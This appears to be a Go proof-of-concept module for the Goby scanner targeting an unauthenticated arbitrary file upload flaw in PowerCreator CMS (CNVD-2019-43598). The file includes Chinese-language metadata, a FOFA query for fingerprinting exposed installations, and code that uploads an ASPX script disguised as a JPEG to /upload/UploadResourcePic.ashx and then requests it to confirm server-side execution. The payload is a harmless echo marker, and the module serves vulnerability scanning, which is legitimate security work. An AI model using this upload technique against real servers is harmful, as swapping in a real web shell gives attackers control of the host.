package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "PowerCreator CMS系统任意文件上传",
    "Description": "PowerCreator CMS是北京翰博尔信息技术股份有限公司基于云架构的综合管理和应用平台。PowerCreator CMS存在无需身份验证的任意文件上传漏洞，攻击者可利用该漏洞获取网站服务器控制权。",
    "Product": "PowerCreator CMS",
    "Homepage": "http://www.powercreator.com.cn/",
    "DisclosureDate": "2019-12-12",
    "Author": "",
    "FofaQuery": "(title=\"PowerCreator CMS\" || body=\"Email:Support@powercreator.com.cn<br />\" || (body=\"<span class=\\\"Bottom_VersionNO\\\">\" && body=\"PowerCreator \")) || title=\"PowerCreator CMS\" || body=\"Email:Support@powercreator.com.cn<br />\" || (body=\"<span class=\\\"Bottom_VersionNO\\\">\" && body=\"PowerCreator \")",
    "Level": "3",
    "CveID": "",
    "CNNVD": [],
    "CNVD": [
        "CNVD-2019-43598"
    ],
    "CVSS": "9.8",
    "Tags": [
        "文件上传"
    ],
    "VulType": [
        "文件上传"
    ],
    "Impact": "<p>PowerCreator CMS是北京翰博尔信息技术股份有限公司基于云架构的综合管理和应用平台。</p><p>PowerCreator CMS存在无需身份验证的任意文件上传漏洞，攻击者可利用该漏洞获取网站服务器控制权。</p>",
    "Recommendation": "<p>1、官方已修复该漏洞，请用户升级至最新版本：<a href=\"http://www.powercreator.com.cn/\">http://www.powercreator.com.cn/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
    "References": [
        "https://xz.aliyun.com/t/8478"
    ],
    "HasExp": false,
    "ExpParams": [],
    "is0day": false,
    "ExpTips": {
        "type": "Tips",
        "content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Posttime": "2021-02-03 16:49:45",
    "fofacli_version": "3.10.10",
    "fofascan_version": "0.1.16",
    "status": "0",
    "GobyQuery": "(title=\"PowerCreator CMS\" || body=\"Email:Support@powercreator.com.cn<br />\" || (body=\"<span class=\\\"Bottom_VersionNO\\\">\" && body=\"PowerCreator \")) || title=\"PowerCreator CMS\" || body=\"Email:Support@powercreator.com.cn<br />\" || (body=\"<span class=\\\"Bottom_VersionNO\\\">\" && body=\"PowerCreator \")",
    "PocId": "9938"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//httpclient.SetDefaultProxy("http://127.0.0.1:8080")
			aaa := goutils.RandomHexString(18)
			shell := "<%@ Page Language=\"Jscript\"%><%Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\""+ base64.StdEncoding.EncodeToString([]byte(aaa)) +"\")));%>"
			bbb := goutils.RandomHexString(9)
			ctf := httpclient.NewPostRequestConfig("/upload/UploadResourcePic.ashx?ResourceID=" + bbb)
			ctf.Header.Store("Content-Type", "multipart/form-data; boundary=---------------------------20873900192357278038549710136")
			ctf.Data = "-----------------------------20873900192357278038549710136\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"abc7788.aspx\"\r\nContent-Type: image/jpeg\r\n\r\n" + shell + "\r\n-----------------------------20873900192357278038549710136--"
			resp , err :=httpclient.DoHttpRequest(u,ctf)
			if err != nil{
				return false
			}
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html,base64.StdEncoding.EncodeToString([]byte(bbb)) + ".ASPX"){
				ctf2 := httpclient.NewGetRequestConfig("/ResourcePic/"+ base64.StdEncoding.EncodeToString([]byte(bbb)) +".ASPX")
				resp2, err2 := httpclient.DoHttpRequest(u,ctf2)
				if err2 != nil{
					return false
				}
				if resp2.StatusCode == 200 && strings.Contains(resp2.Utf8Html,aaa){
					return true
				}
			}else {
				return false
			}
			return false
		},
		nil,
	))
}
